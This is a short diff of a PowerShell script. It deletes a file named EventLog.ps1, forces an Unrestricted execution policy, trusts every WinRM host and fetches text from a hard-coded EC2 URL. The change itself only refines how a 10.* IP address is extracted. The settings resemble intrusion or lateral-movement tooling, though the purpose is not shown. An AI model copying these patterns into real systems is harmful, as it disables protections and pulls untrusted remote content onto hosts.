@@ -9,7 +9,7 @@ remove-item c:\Windows\EventLog.ps1
 import-module activedirectory
 set-executionpolicy Unrestricted -force
 
-$hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")}
+$hostIP= Get-NetIPAddress | where {($_.IPAddress -like "10.*")} | foreach{$_.IPAddress}
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
 $toAppend=invoke-restmethod http://ec2-44-192-30-152.compute-1.amazonaws.com/eeee/timeZ.txt
